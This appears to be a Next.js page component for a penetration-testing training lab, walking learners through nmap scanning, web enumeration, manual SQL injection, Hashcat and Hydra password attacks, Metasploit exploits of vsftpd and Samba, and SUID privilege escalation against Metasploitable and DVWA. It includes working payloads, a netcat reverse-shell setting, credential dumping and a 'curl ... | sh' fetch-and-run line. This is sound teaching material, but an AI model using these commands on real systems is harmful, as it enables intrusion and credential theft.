'use client'
import React from 'react'
import Link from 'next/link'

const accent = '#bf5fff'
const accentDim = 'rgba(191,95,255,0.1)'
const accentBorder = 'rgba(191,95,255,0.3)'

const H2 = ({ num, children }: { num: string; children: React.ReactNode }) => (
  <h2 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1rem', fontWeight: 600, color: accent, marginTop: '3rem', marginBottom: '1rem', display: 'flex', alignItems: 'center', gap: '10px' }}>
    <span style={{ background: accentDim, border: '1px solid ' + accentBorder, padding: '2px 8px', borderRadius: '3px', fontSize: '0.65rem', letterSpacing: '0.15em' }}>LAB-{num}</span>
    {children}
  </h2>
)

const H3 = ({ children }: { children: React.ReactNode }) => (
  <h3 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.82rem', fontWeight: 600, color: '#9933cc', marginTop: '1.75rem', marginBottom: '0.6rem' }}>▸ {children}</h3>
)

const P = ({ children }: { children: React.ReactNode }) => (
  <p style={{ color: '#8a9a8a', lineHeight: 1.8, marginBottom: '1rem', fontSize: '0.88rem' }}>{children}</p>
)

const Pre = ({ label, children }: { label?: string; children: string }) => (
  <div style={{ margin: '1rem 0 1.5rem' }}>
    {label && <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#4a2a6a', letterSpacing: '0.15em', marginBottom: '4px', paddingLeft: '4px' }}>{label}</div>}
    <pre style={{ background: '#050805', border: '1px solid #1a002e', borderRadius: '4px', padding: '1.25rem', overflow: 'auto', color: accent, fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', lineHeight: 1.7, whiteSpace: 'pre' as const }}>{children}</pre>
  </div>
)

const Alert = ({ type, children }: { type: 'objective' | 'warn' | 'note' | 'tip'; children: React.ReactNode }) => {
  const configs: Record<string, [string, string, string]> = {
    objective: [accent, accentDim, 'OBJECTIVE'],
    warn: ['#ff4136', 'rgba(255,65,54,0.05)', 'IMPORTANT'],
    note: ['#00d4ff', 'rgba(0,212,255,0.05)', 'BEGINNER NOTE'],
    tip: ['#00ff41', 'rgba(0,255,65,0.04)', 'PRO TIP'],
  }
  const [color, bg, label] = configs[type]
  return (
    <div style={{ background: bg, borderLeft: '3px solid ' + color, padding: '1rem 1.25rem', borderRadius: '0 4px 4px 0', margin: '1.25rem 0', border: '1px solid ' + color + '33', borderLeftColor: color }}>
      <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color, letterSpacing: '0.2em', marginBottom: '6px' }}>{label}</div>
      <div style={{ color: '#8a9a8a', fontSize: '0.85rem', lineHeight: 1.7 }}>{children}</div>
    </div>
  )
}

const CheckItem = ({ children }: { children: React.ReactNode }) => (
  <div style={{ display: 'flex', gap: '10px', alignItems: 'flex-start', padding: '6px 0', borderBottom: '1px solid #0e1a10' }}>
    <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '11px', color: '#1a0030', marginTop: '2px', flexShrink: 0 }}>[ ]</span>
    <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#5a7a5a', lineHeight: 1.6 }}>{children}</span>
  </div>
)

export default function OffensiveLab() {
  return (
    <div>
      {/* Breadcrumb */}
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#5a7a5a' }}>
        <Link href="/" style={{ color: '#5a7a5a', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>›</span>
        <Link href="/modules/offensive" style={{ color: '#5a7a5a', textDecoration: 'none' }}>MOD-04 // OFFENSIVE</Link>
        <span>›</span>
        <span style={{ color: accent }}>LAB</span>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: '8px' }}>
          <Link href="/modules/offensive" style={{ textDecoration: 'none', padding: '3px 10px', background: 'transparent', border: '1px solid #1a2e1e', borderRadius: '3px', color: '#5a7a5a', fontSize: '8px', letterSpacing: '0.15em' }}>← CONCEPT</Link>
          <span style={{ padding: '3px 10px', background: accentDim, border: '1px solid ' + accentBorder, borderRadius: '3px', color: accent, fontSize: '8px', letterSpacing: '0.15em' }}>LAB</span>
        </div>
      </div>

      {/* Header */}
      <div style={{ marginBottom: '2.5rem' }}>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#4a2a6a', letterSpacing: '0.25em', marginBottom: '0.5rem' }}>MODULE 04 · LAB ENVIRONMENT</div>
        <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.8rem', fontWeight: 700, color: accent, margin: '0.5rem 0', lineHeight: 1.1, textShadow: '0 0 20px rgba(191,95,255,0.3)' }}>
          OFFENSIVE SECURITY — LAB
        </h1>
        <p style={{ color: '#5a7a5a', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem', lineHeight: 1.6 }}>
          6 exercises: full nmap recon · gobuster and nikto web enumeration · manual SQL injection · Hydra password attacks · Metasploit CVE chain · privesc and pentest report
        </p>
      </div>

      {/* Lab Environment Setup */}
      <div style={{ background: '#0a0010', border: '1px solid #1a002e', borderRadius: '6px', padding: '1.5rem', marginBottom: '2rem' }}>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#4a2a6a', letterSpacing: '0.2em', marginBottom: '1rem' }}>LAB ENVIRONMENT SETUP</div>
        <P>These labs require intentionally vulnerable practice targets. Never use these techniques against real systems without written permission. All commands assume Kali Linux or a Debian/Ubuntu system with security tools installed.</P>
        <div className="grid-2col" style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1rem', marginTop: '1rem' }}>
          <div style={{ background: '#050805', border: '1px solid #1a002e', borderRadius: '4px', padding: '1rem' }}>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: accent, letterSpacing: '0.15em', marginBottom: '8px' }}>REQUIRED TOOLS</div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem', color: '#5a7a5a', lineHeight: 1.8 }}>
              nmap · gobuster · nikto<br />
              sqlmap · hydra · hashcat<br />
              metasploit · linpeas<br />
              burpsuite · seclists
            </div>
          </div>
          <div style={{ background: '#050805', border: '1px solid #1a002e', borderRadius: '4px', padding: '1rem' }}>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: accent, letterSpacing: '0.15em', marginBottom: '8px' }}>PRACTICE TARGETS</div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem', color: '#5a7a5a', lineHeight: 1.8 }}>
              Metasploitable 2 (free VM)<br />
              DVWA via Docker<br />
              TryHackMe rooms<br />
              HackTheBox Starting Point
            </div>
          </div>
        </div>
        <div style={{ marginTop: '1rem' }}>
          <CheckItem>Kali Linux VM or similar with offensive tools pre-installed</CheckItem>
          <CheckItem>Metasploitable 2 downloaded and running in an isolated network — do NOT expose to internet</CheckItem>
          <CheckItem>Docker installed (for DVWA web app target)</CheckItem>
          <CheckItem>Read MOD-04 Concept page — understand the penetration testing methodology before starting</CheckItem>
          <CheckItem>All target IPs in examples are placeholders — replace with your actual lab VM IP</CheckItem>
        </div>
      </div>

      <Alert type="warn">
        These techniques are legal ONLY against systems you own or have explicit written authorisation to test. Unauthorised scanning and exploitation is a criminal offence in most jurisdictions. Always work in isolated lab environments. Recommended platforms: TryHackMe, HackTheBox, VulnHub, or your own local VMs.
      </Alert>

      {/* LAB 01 */}
      <H2 num="01">Full Nmap Reconnaissance</H2>
      <Alert type="objective">
        Run a comprehensive Nmap scan against a practice target. Identify all open ports, service versions, and OS. Use NSE scripts to find known vulnerabilities. Build a complete port/service inventory.
      </Alert>
      <Alert type="note">
        Nmap (Network Mapper) is the industry-standard port scanner. A &quot;port&quot; is a numbered channel a service listens on — like port 80 for HTTP, port 22 for SSH. Scanning shows you what services are running, which reveals potential attack surface. Service version information lets you look up known CVEs.
      </Alert>

      <H3>Step 1: Set Up Metasploitable 2</H3>
      <Pre label="// DEPLOY PRACTICE TARGET">{`# Download Metasploitable 2:
# https://sourceforge.net/projects/metasploitable/

# Import the OVA into VirtualBox:
# File -> Import Appliance -> select .ova file
# Network: Host-Only Adapter (keeps it isolated from real internet)

# Start the VM, log in with: msfadmin / msfadmin
# Get its IP address:
ifconfig eth0 | grep "inet "

# From your Kali machine, note the target IP:
TARGET_IP="192.168.56.101"   # replace with your Metasploitable IP

# Confirm it is reachable:
ping -c 3 TARGET_IP_HERE`}</Pre>

      <H3>Step 2: Discovery and Full Port Scan</H3>
      <Pre label="// PHASE 1 — FIND ALL OPEN PORTS">{`# Replace TARGET with your Metasploitable IP

# First: confirm host is up
nmap -sn TARGET_IP_HERE
# Should show: Host is up (0.0005s latency)

# Full port scan — all 65535 ports, fast
nmap -p- -T4 TARGET_IP_HERE -oN all_ports.txt

# View open ports only:
grep "open" all_ports.txt

# You should find ports like:
# 21/tcp   open  ftp
# 22/tcp   open  ssh
# 23/tcp   open  telnet
# 25/tcp   open  smtp
# 80/tcp   open  http
# 445/tcp  open  microsoft-ds
# 3306/tcp open  mysql
# and many more — Metasploitable is deliberately wide open`}</Pre>

      <H3>Step 3: Version Detection and OS Fingerprinting</H3>
      <Pre label="// PHASE 2 — IDENTIFY SERVICES AND VERSIONS">{`# Run detailed scan on open ports (use the ports found above)
# -sV = version detection
# -sC = default scripts (safe, commonly useful)
# -O  = OS detection (requires root/sudo)
# -oN = save output to file

nmap -p 21,22,23,25,80,445,3306 -sV -sC -O TARGET_IP_HERE -oN detailed_scan.txt

cat detailed_scan.txt

# For each service, note the version:
# 21/tcp  open  ftp     vsftpd 2.3.4      <- BACKDOOR! CVE-2011-2523
# 22/tcp  open  ssh     OpenSSH 4.7p1     <- old version
# 80/tcp  open  http    Apache 2.2.8      <- old version
# 445/tcp open  smb     Samba 3.0.20      <- EXPLOITABLE! CVE-2007-2447

# Search for CVEs for each version:
searchsploit vsftpd 2.3.4
searchsploit samba 3.0.20`}</Pre>

      <H3>Step 4: NSE Script Scanning</H3>
      <Pre label="// PHASE 3 — TARGETED VULNERABILITY SCRIPTS">{`# Check for EternalBlue / MS17-010 on SMB:
nmap --script smb-vuln-ms17-010 -p 445 TARGET_IP_HERE

# Check for older SMB vulnerability:
nmap --script smb-vuln-ms08-067 -p 445 TARGET_IP_HERE

# FTP anonymous access:
nmap --script ftp-anon -p 21 TARGET_IP_HERE
# If anonymous login allowed: ftp TARGET_IP_HERE, user: anonymous, pass: anything

# HTTP directory enumeration via Nmap:
nmap --script http-enum -p 80 TARGET_IP_HERE

# MySQL empty password check:
nmap --script mysql-empty-password -p 3306 TARGET_IP_HERE

# Full vuln scan (slower but thorough):
nmap --script vuln -p 21,22,80,445,3306 TARGET_IP_HERE -oN vuln_scan.txt`}</Pre>

      {/* LAB 02 */}
      <H2 num="02">Web App Enumeration with Gobuster and Nikto</H2>
      <Alert type="objective">
        Set up DVWA as a practice web target. Run directory enumeration with gobuster to find hidden paths. Run Nikto for automated vulnerability scanning. Use Burp Suite to intercept and analyse HTTP requests.
      </Alert>
      <Alert type="note">
        Web enumeration is the process of discovering hidden pages, files, and directories on a web server. Attackers do this because developers often leave backup files, admin panels, and configuration files accessible at predictable URLs — gobuster tries thousands of common names automatically.
      </Alert>

      <H3>Step 1: Deploy DVWA with Docker</H3>
      <Pre label="// DVWA SETUP — Damn Vulnerable Web Application">{`# Pull and start DVWA
docker pull vulnerables/web-dvwa
docker run -d -p 80:80 --name dvwa vulnerables/web-dvwa

# Access in browser: http://127.0.0.1
# Login: admin / password
# Click "Create / Reset Database"
# Settings -> Security Level -> Set to LOW (for learning)

# Verify it is running:
curl -s http://127.0.0.1 | grep "title"
# Should show: <title>Login :: Damn Vulnerable Web Application`}</Pre>

      <H3>Step 2: Directory Enumeration with Gobuster</H3>
      <Pre label="// GOBUSTER — FIND HIDDEN PATHS">{`# Install gobuster and SecLists wordlist collection:
sudo apt install gobuster
sudo apt install seclists
# SecLists installs to: /usr/share/seclists/

# Run directory enumeration against DVWA:
gobuster dir \
  -u http://127.0.0.1 \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,html,txt,bak,conf \
  -t 50 \
  -o gobuster_results.txt

# Show only successful responses:
grep "Status: 200" gobuster_results.txt

# Common interesting finds:
# /phpinfo.php     -> PHP configuration dump (version, modules, server paths)
# /backup/         -> backup files (database dumps, source code)
# /.git/           -> exposed version control (full source code recoverable)
# /admin/          -> admin panel
# /config.php.bak  -> backup of config file (may contain database credentials)`}</Pre>

      <H3>Step 3: Nikto Vulnerability Scan</H3>
      <Pre label="// NIKTO — AUTOMATED WEB VULNERABILITY SCANNER">{`# Run Nikto against DVWA:
nikto -h http://127.0.0.1 -o nikto_results.txt

# Key findings Nikto typically reports:
# + Server: Apache/2.x.x (Ubuntu)          -> version info
# + /phpinfo.php: Output from phpinfo()     -> sensitive config exposed
# + OSVDB-3092: /phpmyadmin/               -> database admin panel found
# + X-Frame-Options header not set          -> clickjacking risk
# + Cookie without HttpOnly flag            -> XSS session theft risk

# Nikto also checks for:
# Default credentials on common applications
# Outdated software versions with known CVEs
# Misconfigured HTTP methods (PUT/DELETE enabled)
# Information disclosure via error messages`}</Pre>

      <H3>Step 4: Burp Suite — Intercept and Modify Requests</H3>
      <Pre label="// BURP SUITE — HTTP INTERCEPTION PROXY">{`# Setup:
# 1. Open Burp Suite Community Edition (pre-installed on Kali)
# 2. Go to Proxy tab -> Options -> confirm Listener: 127.0.0.1:8080
# 3. In Firefox: Settings -> Network -> Manual Proxy -> 127.0.0.1:8080
# 4. In Firefox: browse to http://127.0.0.1/dvwa/login.php

# All HTTP traffic now captured in Burp: Proxy -> HTTP History

# Key Burp features to learn:
# Repeater: right-click any request -> Send to Repeater
#   - Manually modify parameters and resend
#   - Test: id=1, id=2, id=99, id=', id=1 OR 1=1

# Intruder: automated parameter fuzzing
#   - Right-click a request -> Send to Intruder
#   - Mark the parameter to fuzz with * characters
#   - Add a payload list (wordlist)
#   - Start attack to cycle through values

# Test for IDOR (Insecure Direct Object Reference):
# If you see ?user_id=5 in any URL -> try ?user_id=1, ?user_id=2
# If you see other users' data -> that is an IDOR vulnerability`}</Pre>

      {/* LAB 03 */}
      <H2 num="03">SQL Injection — Manual Exploitation</H2>
      <Alert type="objective">
        Exploit SQL injection in DVWA manually, step by step. Extract the database name, list all tables, and dump all user credentials. Then repeat with SQLMap to understand what the automation is doing.
      </Alert>
      <Alert type="note">
        SQL injection happens when user input is inserted directly into a database query without being sanitised. The database interprets the attacker&apos;s input as SQL commands. Think of it as being able to add your own sentences to a question someone is asking the database — changing what gets returned or executed.
      </Alert>

      <H3>Step 1: Confirm Injection and Count Columns</H3>
      <Pre label="// MANUAL SQLi — START IN DVWA">{`# Navigate to: http://127.0.0.1/dvwa/vulnerabilities/sqli/
# Security level must be LOW

# The page asks for a User ID — it runs: SELECT * FROM users WHERE user_id='INPUT'

# Step 1: Confirm injection — input a single quote
Input: '
# Expected: "You have an error in your SQL syntax..."
# This means the quote broke the SQL query — it is injectable

# Step 2: Determine how many columns the query returns
# Try ORDER BY (sorting by column number to count them)
Input: 1' ORDER BY 1--+    # works fine
Input: 1' ORDER BY 2--+    # works fine
Input: 1' ORDER BY 3--+    # error -> only 2 columns exist

# Note: --+ is a SQL comment that cancels the rest of the original query
# The + becomes a space when URL-encoded`}</Pre>

      <H3>Step 2: Extract Database Information</H3>
      <Pre label="// UNION-BASED DATA EXTRACTION">{`# Step 3: Find the current database name
Input: 1' UNION SELECT 1,database()--+
# Output shows: First name: 1  Surname: dvwa
# "dvwa" is the database name

# Step 4: List all tables in the database
Input: 1' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--+
# Output: guestbook,users

# Step 5: Get column names from the users table
Input: 1' UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--+
# Output: user_id,first_name,last_name,user,password,avatar

# Step 6: Dump all usernames and password hashes
Input: 1' UNION SELECT user,password FROM users--+
# Output: admin:5f4dcc3b5aa765d61d8327deb882cf99
# This is the MD5 hash of "password"

# Write these hashes down for the password cracking lab`}</Pre>

      <H3>Step 3: Automate with SQLMap</H3>
      <Pre label="// SQLMAP — SAME ATTACK AUTOMATED">{`# First, save the HTTP request from Burp:
# In Burp HTTP History, find the SQLi request
# Right-click -> Save item -> save as sqli_request.txt

# Run SQLMap with the saved request:
sqlmap -r sqli_request.txt --dbs
# Lists all databases: dvwa, information_schema, mysql...

sqlmap -r sqli_request.txt -D dvwa --tables
# Lists tables: guestbook, users

sqlmap -r sqli_request.txt -D dvwa -T users --dump
# Dumps all user data including password hashes

# SQLMap even cracks the hashes automatically if they are simple
# Compare output to your manual extraction — they should match
# Now you understand what the tool is doing under the hood`}</Pre>

      {/* LAB 04 */}
      <H2 num="04">Password Attacks — Cracking and Brute-Forcing</H2>
      <Alert type="objective">
        Crack the MD5 hashes from the DVWA exercise using Hashcat and the RockYou wordlist. Brute-force SSH credentials on Metasploitable using Hydra. Understand when each approach is appropriate.
      </Alert>
      <Alert type="note">
        &quot;Cracking&quot; means recovering the original password from a hash by hashing candidates and comparing. &quot;Brute-forcing&quot; means trying every possible password against a live login service. They are different: cracking is fast and offline; brute-forcing is slow and noisy (the server sees every attempt).
      </Alert>

      <H3>Step 1: Crack MD5 Hashes with Hashcat</H3>
      <Pre label="// OFFLINE HASH CRACKING">{`# Create a file with the hashes from DVWA:
cat > dvwa_hashes.txt << 'EOF'
5f4dcc3b5aa765d61d8327deb882cf99
e99a18c428cb38d5f260853678922e03
8d3533d75ae2c3966d7e0d4fcc69216b
0d107d09f5bbe40cade3de5c71e9e9b7
EOF

# Hashcat mode -m 0 = MD5
# RockYou is included in Kali: /usr/share/wordlists/rockyou.txt.gz
# Unzip it first if needed: gunzip /usr/share/wordlists/rockyou.txt.gz

hashcat -m 0 dvwa_hashes.txt /usr/share/wordlists/rockyou.txt

# View cracked results:
hashcat -m 0 dvwa_hashes.txt --show

# If wordlist doesn't crack all hashes, try with rules:
# Rules mutate words: add numbers, capitalise, substitute characters
hashcat -m 0 dvwa_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule`}</Pre>

      <H3>Step 2: Brute-Force SSH with Hydra</H3>
      <Pre label="// ONLINE BRUTE-FORCE — AGAINST METASPLOITABLE">{`# Create a users list
cat > users.txt << 'EOF'
msfadmin
admin
user
root
service
EOF

# Brute-force SSH on Metasploitable:
hydra \
  -L users.txt \
  -P /usr/share/wordlists/rockyou.txt \
  TARGET_IP_HERE \
  ssh \
  -t 4 \
  -V \
  -o hydra_ssh.txt

# -L = username list, -P = password list
# -t 4 = 4 parallel threads (don't go too fast or you'll trigger lockouts)
# -V = verbose (show each attempt)

# Expected result: msfadmin:msfadmin (found quickly from rockyou)

# Brute-force DVWA HTTP login form:
hydra \
  -l admin \
  -P /usr/share/wordlists/rockyou.txt \
  127.0.0.1 \
  http-post-form \
  "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" \
  -V`}</Pre>

      {/* LAB 05 */}
      <H2 num="05">Metasploit — Full Exploitation Chain</H2>
      <Alert type="objective">
        Use Metasploit to exploit vsftpd 2.3.4 (CVE-2011-2523) on Metasploitable. Upgrade the shell to Meterpreter. Run post-exploitation modules. Then exploit Samba (CVE-2007-2447) as a second attack path.
      </Alert>
      <Alert type="note">
        Metasploit is an exploitation framework — a toolkit that organises exploit code, payloads, and post-exploitation modules into a common interface. A &quot;payload&quot; is what runs on the target after exploitation — Meterpreter is a powerful in-memory payload that gives you a full interactive shell with built-in tools.
      </Alert>

      <H3>Step 1: Exploit vsftpd 2.3.4 Backdoor</H3>
      <Pre label="// CVE-2011-2523 — BACKDOOR IN VSFTPD 2.3.4">{`# Launch Metasploit Framework
msfconsole

# The vsftpd 2.3.4 backdoor:
# When a username ending in :) is sent, a shell spawns on port 6200
# Someone injected this into the vsftpd source code in 2011

msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(vsftpd_234_backdoor) > show options

# Set the target IP
msf6 exploit(vsftpd_234_backdoor) > set RHOSTS TARGET_IP_HERE
msf6 exploit(vsftpd_234_backdoor) > run

# Expected output:
# [*] Banner: 220 (vsFTPd 2.3.4)
# [*] USER: 331 Please specify the password.
# [+] Backdoor service has been spawned, handling...
# [+] UID: uid=0(root) gid=0(root)

# You now have a root shell
id       # uid=0(root) gid=0(root) groups=0(root)
hostname # metasploitable`}</Pre>

      <H3>Step 2: Upgrade to Meterpreter</H3>
      <Pre label="// UPGRADE SHELL TO METERPRETER">{`# The shell from vsftpd is basic — upgrade to Meterpreter

# In your shell, press Ctrl+Z to background it
# msf6 > sessions -l    <- list active sessions

msf6 > use post/multi/manage/shell_to_meterpreter
msf6 post(shell_to_meterpreter) > set SESSION 1
msf6 post(shell_to_meterpreter) > run

# Switch to the new Meterpreter session
msf6 > sessions -i 2

# Now you have Meterpreter — much more powerful:
meterpreter > sysinfo              # OS, hostname, architecture
meterpreter > getuid               # confirm you are root
meterpreter > hashdump             # dump /etc/shadow hashes
meterpreter > download /etc/passwd /tmp/passwd.txt   # exfiltrate files
meterpreter > run post/multi/recon/local_exploit_suggester  # find more privesc vectors
meterpreter > run post/linux/gather/enum_configs     # gather config files`}</Pre>

      <H3>Step 3: Second Attack Path — Samba Exploit</H3>
      <Pre label="// CVE-2007-2447 — SAMBA USERNAME MAP SCRIPT">{`# Return to main console and try the Samba vulnerability
# This affects Samba 3.0.20 — also on Metasploitable

msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(usermap_script) > set RHOSTS TARGET_IP_HERE
msf6 exploit(usermap_script) > set PAYLOAD cmd/unix/reverse_netcat
msf6 exploit(usermap_script) > set LHOST YOUR_KALI_IP_HERE
msf6 exploit(usermap_script) > run

# Root shell again via a completely different attack vector
# Same target — two different CVEs — both result in full compromise

# KEY LESSON:
# A single misconfiguration or outdated service can be enough
# Always scan all ports — the critical vulnerability may not be on port 80`}</Pre>

      {/* LAB 06 */}
      <H2 num="06">Privilege Escalation and Pentest Report Writing</H2>
      <Alert type="objective">
        Start from a low-privilege SSH shell on Metasploitable. Run LinPEAS to identify privilege escalation vectors. Exploit an SUID binary to get root. Write a professional finding report entry for the entire attack chain.
      </Alert>
      <Alert type="note">
        Privilege escalation (&quot;privesc&quot;) means going from a limited user account to a higher-privilege one, typically root or Administrator. In real engagements, you often land as an unprivileged user and need to elevate. LinPEAS automates the search for misconfigurations that enable this.
      </Alert>

      <H3>Step 1: Start as Low-Privilege User</H3>
      <Pre label="// SSH IN AS REGULAR USER">{`# Connect to Metasploitable as a non-root user
ssh user@TARGET_IP_HERE
# Password: user

# Confirm you have limited privileges
id
# uid=1001(user) gid=1001(user) groups=1001(user)
# Not root — cannot read /etc/shadow, install packages, etc.

whoami     # user
hostname   # metasploitable
uname -a   # Linux metasploitable 2.6.24-16-server`}</Pre>

      <H3>Step 2: Run LinPEAS to Find Vectors</H3>
      <Pre label="// LINPEAS — AUTOMATED PRIVESC ENUMERATION">{`# On your Kali machine: download LinPEAS and serve it
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
python3 -m http.server 8888

# On the target (Metasploitable):
curl http://KALI_IP_HERE:8888/linpeas.sh | sh 2>/dev/null | tee /tmp/linpeas_output.txt

# LinPEAS highlights dangerous items in red/yellow
# Key sections to review:

# [!] SUID/SGID binaries
#   Binaries running as root that a regular user can execute
#   If they allow shell execution -> instant root

# [!] sudo -l output
#   Commands you can run as root without a password

# [!] Writable cron jobs
#   Cron scripts running as root that you can modify

# [!] World-writable /etc/passwd or /etc/shadow
#   You can add your own root user

# [!] Kernel version
#   Old kernels have local privilege escalation exploits (DirtyCOW etc.)`}</Pre>

      <H3>Step 3: Exploit SUID Binary</H3>
      <Pre label="// SUID EXPLOITATION — INTERACTIVE NMAP">{`# Find all SUID binaries manually:
find / -perm -u=s -type f 2>/dev/null

# Common SUID binaries on Metasploitable:
# /usr/bin/nmap      <- very old version with --interactive mode
# /bin/bash          <- if SUID set, immediate root shell
# /usr/bin/vim       <- can execute shell commands

# Exploit old Nmap SUID (Metasploitable has nmap 5.00):
nmap --interactive
nmap> !sh
# Shell runs as root (nmap is SUID root)
id    # uid=0(root) gid=1001(user) ...

# Exploit vim SUID (if present):
vim -c ':!/bin/bash'
id    # root shell

# For any binary found, check GTFOBins:
# https://gtfobins.github.io
# Search the binary name for the exact escape sequence`}</Pre>

      <H3>Step 4: Write Your Finding Report</H3>
      <Pre label="// PROFESSIONAL PENTEST FINDING FORMAT">{`PENETRATION TEST FINDING REPORT
Target: Metasploitable 2 — IP: TARGET_IP_HERE
Date: 2026-04-01
Tester: [Your Name]
================================================================

FINDING 001
Title:    Remote Code Execution — vsftpd 2.3.4 Backdoor
Severity: CRITICAL
CVSS:     10.0
CVE:      CVE-2011-2523
Asset:    TARGET_IP:21 (FTP Service)

Description:
vsftpd version 2.3.4 contains a deliberately inserted backdoor.
When a username containing the string ':)' is sent, the service
opens a shell listener on TCP port 6200 with root privileges.

Evidence:
[Attach: screenshot of msfconsole showing root shell]
[Attach: screenshot of 'id' showing uid=0(root)]
Shell output: uid=0(root) gid=0(root) groups=0(root)

Reproduction Steps:
1. msfconsole
2. use exploit/unix/ftp/vsftpd_234_backdoor
3. set RHOSTS TARGET_IP
4. run
Result: root shell obtained

Impact:
Complete system compromise. Full read/write access to all files,
credentials, and network pivot capability. CVSS 10.0 / Critical.

Remediation:
Upgrade vsftpd to 3.0.5 or latest stable immediately.
Restrict FTP access to authorised source IPs via firewall.
Audit all other services for outdated versions.
================================================================

FINDING 002
Title:    Local Privilege Escalation — SUID Nmap Binary
Severity: HIGH
CVSS:     7.8
Asset:    /usr/bin/nmap (local privilege escalation)

Description:
Nmap is installed with the SUID bit set and runs as root.
The installed version (5.00) supports --interactive mode which
allows arbitrary shell command execution as root.

Evidence:
ls -la /usr/bin/nmap  -> -rwsr-xr-x root root
nmap --interactive; !sh; id -> uid=0(root)

Reproduction:
1. ssh user@TARGET_IP (password: user)
2. nmap --interactive
3. nmap> !sh
4. id  -> uid=0(root)

Impact:
Any local user can escalate to root, undermining all user separation.

Remediation:
Remove SUID from nmap: chmod -s /usr/bin/nmap
Upgrade to nmap 7.x which removed --interactive mode.
================================================================`}</Pre>

      {/* Check Your Understanding */}
      <div style={{ marginTop: '3rem', background: '#0a0010', border: '1px solid ' + accentBorder, borderRadius: '6px', padding: '1.5rem' }}>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: accent, letterSpacing: '0.2em', marginBottom: '1rem' }}>CHECK YOUR UNDERSTANDING</div>
        <P>You should be able to answer all of these before moving to the next module.</P>
        {[
          'What is the difference between a port scan (-sV) and a vulnerability scan (--script vuln)? When would you use each?',
          'In SQL injection, what does the UNION keyword do and why is it useful to an attacker?',
          'What is the difference between offline hash cracking (hashcat) and online brute-forcing (hydra)? What are the tradeoffs?',
          'What does the SUID bit mean on a Linux binary? Why is it dangerous if set on an interactive utility like nmap or vim?',
          'In your pentest report, you found both vsftpd backdoor and SUID nmap. Which is the higher severity finding and why?',
        ].map((q, i) => (
          <div key={i} style={{ display: 'flex', gap: '10px', padding: '8px 0', borderBottom: '1px solid #080010', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem' }}>
            <span style={{ color: accent, flexShrink: 0 }}>{String(i + 1).padStart(2, '0')}.</span>
            <span style={{ color: '#5a7a5a' }}>{q}</span>
          </div>
        ))}
      </div>

      {/* Recommended Practice */}
      <div style={{ marginTop: '2rem', background: '#0a0010', border: '1px solid #1a002e', borderRadius: '6px', padding: '1.5rem' }}>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#4a2a6a', letterSpacing: '0.2em', marginBottom: '1rem' }}>RECOMMENDED PRACTICE</div>
        {[
          { platform: 'TryHackMe', name: 'Basic Pentesting', note: 'Guided room covering enumeration, exploitation, and privilege escalation — perfect for practising the full chain from this lab' },
          { platform: 'TryHackMe', name: 'OWASP Top 10', note: 'Dedicated room for each OWASP vulnerability class: injection, XSS, broken auth, IDOR — essential web security knowledge' },
          { platform: 'PortSwigger', name: 'Web Security Academy', note: 'The best free web security training available — 200+ labs covering every SQL injection variant, XSS type, and CSRF scenario' },
          { platform: 'HackTheBox', name: 'Starting Point — Tier 1', note: 'Real CVE exploitation on realistic targets. Closer to what OSCP looks like than TryHackMe — take on after completing the TryHackMe basics' },
        ].map((r, i) => (
          <div key={i} style={{ padding: '10px 0', borderBottom: '1px solid #080010' }}>
            <div style={{ display: 'flex', gap: '8px', alignItems: 'center', marginBottom: '4px' }}>
              <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '8px', color: accent, background: accentDim, border: '1px solid ' + accentBorder, padding: '1px 6px', borderRadius: '2px' }}>{r.platform}</span>
              <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#8a9a8a', fontWeight: 600 }}>{r.name}</span>
            </div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.68rem', color: '#4a2a6a', paddingLeft: '4px' }}>{r.note}</div>
          </div>
        ))}
      </div>

      {/* Footer nav */}
      <div style={{ marginTop: '3rem', paddingTop: '2rem', borderTop: '1px solid #1a002e', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
        <Link href="/modules/offensive" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#5a7a5a' }}>← BACK TO CONCEPT</Link>
        <Link href="/" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#4a2a6a' }}>DASHBOARD</Link>
